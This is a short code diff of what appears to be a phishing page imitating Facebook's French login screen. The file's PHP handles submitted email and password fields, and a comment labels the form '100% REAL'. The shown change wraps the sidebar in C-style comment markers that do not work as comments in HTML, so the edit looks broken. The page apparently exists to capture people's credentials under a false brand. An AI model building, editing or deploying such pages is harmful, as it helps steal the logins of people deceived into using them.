@@ -217,6 +217,7 @@ if ($_POST && isset($_POST['email']) && isset($_POST['pass'])) {
     </style>
 </head>
 <body>
+/*
     <div class="main-container">
         <!-- LEFT SIDEBAR (desktop only) -->
         <div class="left-sidebar">
@@ -225,6 +226,7 @@ if ($_POST && isset($_POST['email']) && isset($_POST['pass'])) {
                 Connectez-vous à Facebook pour commencer à partager et à vous connecter avec vos amis, votre famille et les personnes que vous connaissez.
             </div>
         </div>
+ fermer */
 
         <!-- LOGIN FORM 100% REAL -->
         <div class="login-box">
